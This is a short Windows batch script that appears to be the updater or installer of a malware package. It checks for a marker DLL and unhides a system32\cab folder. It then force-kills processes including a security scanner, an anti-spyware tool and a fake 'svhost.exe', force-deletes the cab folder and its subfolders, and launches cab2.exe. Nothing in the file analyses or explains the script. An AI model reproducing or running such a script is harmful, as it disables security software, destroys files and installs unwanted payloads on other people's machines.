@echo off
if exist %windir%\system32\swsynth.dll goto end
if exist %windir%\system32\cab\service.exe goto update
cd %windir%
cab2.exe
goto end
:update
attrib +a -h -s -r %windir%\system32\cab
copy %windir%\system32\cab\download\cab32.exe c:\cab32.exe
%windir%\pv.exe -kf service.exe
%windir%\pv.exe -kf service.exe
%windir%\pv.exe -kf xscan.exe
%windir%\pv.exe -kf Ad-watch.exe
%windir%\pv.exe -kf Ad-watch.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\pv.exe -kf svhost.exe
%windir%\sleep for 5s
del %windir%\system32\cab /F /S /Q
del %windir%\system32\cab\copy /F /S /Q
rmdir %windir%\system32\cab\copy /S /Q
rmdir %windir%\system32\cab\download /S /Q
rmdir %windir%\system32\cab\sounds /S /Q
rmdir %windir%\system32\cab\logs /S /Q
rmdir %windir%\system32\cab\uploads /S /Q
rmdir %windir%\system32\cab\dat /S /Q
rmdir %windir%\system32\cab\plugin /S /Q
cd %windir%
cab2.exe
goto end
:end
